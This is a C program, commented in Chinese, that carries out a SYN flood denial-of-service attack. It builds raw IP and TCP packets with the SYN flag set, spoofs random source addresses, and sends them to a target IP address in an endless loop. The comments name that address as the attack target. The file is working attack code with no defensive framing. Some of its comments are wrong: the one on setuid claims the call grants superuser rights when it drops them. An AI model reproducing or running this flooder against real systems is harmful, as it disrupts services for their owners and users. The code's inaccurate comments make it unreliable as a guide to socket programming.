#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define DESTPORT 8080
#define MYPORT	8080

int main(int argc,char *argv[])
{
	int sockfd;
	struct sockaddr_in addr;
	struct sockaddr_in fake_addr;
	int on = 1;
	if(argc != 2)
	{
		fprintf(stderr,"Usage:%sIP\n\a",argv[0]);
		exit(1);
	}
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(DESTPORT);
	inet_aton(argv[1],&addr.sin_addr);
	//创建TCP套接字
	sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(sockfd < 0)
	{
		perror("socket");
		exit(1);
	}
	//设置套接字选项IP_HDRINCL，由用户程序填写IP头部
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
	setuid(getuid());	//获得超级用户权限
	char buffer[100];
	struct ip *ip;
	struct tcphdr *tcp;
	int head_len;
	//数据报的长度即IP头部和TCP头部之和
	head_len = sizeof(struct ip) + sizeof(struct tcphdr);
	bzero(buffer,100);
	//填充IP数据报头部
	ip = (struct ip*)buffer;
	ip->ip_v = IPVERSION;		//IPV4
	ip->ip_hl = sizeof(struct ip)/4;	//IP数据报头部长度
	ip->ip_tos = 0;			//服务类型
	ip->ip_len = htons(head_len);	//IP数据报长度
	ip->ip_id = 0;			//由内核填写
	ip->ip_off = 0;			//由内核填写
	ip->ip_ttl = MAXTTL;		//最长时间255
	ip->ip_p = IPPROTO_TCP;		//传输协议为TCP
	ip->ip_sum = 0;			//由内和填写校验和
	ip->ip_dst = addr.sin_addr;	//目的地址，即攻击目标
	printf("dst address is %s\n",inet_ntoa(addr.sin_addr));
	//开始填写TCP数据报
	tcp = (struct tcphdr*)(buffer + sizeof(struct ip));
	//获取只想tcp头部的指针
	tcp->source = htons(MYPORT);
	tcp->dest = addr.sin_port;	//目的端口
	tcp->seq = random();		//随机产生序列号
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->syn = 1;			//表示SYN数据报
	tcp->check = 0;
	sleep(1);
	while(1)
	{
		fake_addr.sin_addr.s_addr = rand() % 1000000000000;
		ip->ip_src = fake_addr.sin_addr;
		printf("addr is %d\n",ip->ip_src.s_addr);
		sendto(sockfd,buffer,head_len,0,(struct sockaddr*)&addr,sizeof(struct sockaddr));
		//发送攻击数据报
	}
	return 0;
}

